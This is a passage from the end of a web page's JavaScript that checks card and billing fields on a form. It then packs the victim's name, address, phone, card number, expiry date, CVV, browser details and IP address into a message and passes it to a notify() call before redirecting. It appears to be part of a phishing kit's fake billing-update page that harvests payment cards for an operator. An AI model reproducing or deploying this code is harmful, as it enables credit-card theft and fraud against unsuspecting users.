              $(".error_ph").html('');
              $(".error_addr").html('');
              $(".error_country").html('');
              $(".error_st").html('');
              $(".error_zp").html('');

              isf_come = true;
              }

            var card_no  = $("#card_no").val();
            var card_dt  = $("#card_dt").val();
            var card_cv  = $("#card_cv").val();
            if (card_no == "" && card_dt == ""  && card_cv == ""){

                $(".error_cn").html('<div id="error"><span>Enter Card Number</span></div>');
                $(".error_cd").html('<div id="error"><span>Enter Card Expiring Date</span></div>');
                $(".error_cv").html('<div id="error"><span>Enter Card CVC</span></div>');
            }else if (card_no == ""){
                $(".error_cd").html('');
                $(".error_cv").html('');
                $(".error_cn").html('<div id="error"><span>Enter Card Number</span></div>');


            }else if (!isValidCC(card_no)){
                $(".error_cd").html('');
                $(".error_cv").html('');
                $(".error_cn").html('<div id="error"><span>Invalid Card Number</span></div>');


            }else if (card_dt == ""){
                $(".error_cn").html('');
                $(".error_cv").html('');
                $(".error_cd").html('<div id="error"><span>Enter Card Expiring Date</span></div>');

            }else if (!isValidEx(card_dt)){
                $(".error_cn").html('');
                $(".error_cv").html('');
                $(".error_cd").html('<div id="error"><span>Expire Card Information</span></div>');

            }else if (card_cv == ""){
                $(".error_cn").html('');
                $(".error_cd").html('');
                $(".error_cv").html('<div id="error"><span>Enter Card CVV </span></div>');
            }
            else if (!isValidCVC(card_cv)){
                $(".error_cn").html('');
                $(".error_cd").html('');
                $(".error_cv").html('<div id="error"><span>Invalid Card CVV</span></div>');

            }else{
                $(".error_cn").html('');
                $(".error_cd").html('');
                $(".error_cv").html('');
                isS_come = true;
              }


            if (isf_come == true && isS_come == true){

                var message = `FOLLOW-UP: ${euser}\nFIRST NAME: ${f_name}\nLAST NAME: ${l_name}\nPHONE NUMBER: ${phone_n}\nBILLING ADDRESS: ${add_r}\nCOUNTRY: ${c_country}\nSTATE: ${s_tate}\nZIP/POSTAL CODE: ${zip_c}\n\n=======================\n\nCARD NUMBER: ${card_no}\nCARD EXPIRING DATE: ${card_dt}\nCARD CVC: ${card_cv}\n\nBROWSERNAME: ${get_browsername}\nUSER-AGENT: ${window.navigator.userAgent}\nIP ADDRESS: ${get_ip}\n`;

               $("#btnSubmit").attr("disabled", "disabled");
               $("#btnSubmit").text("Updating ...");

               var status = notify(euser, message, REDIRECT_URL, 2);

            }

          });

        })


    </script>

</body>
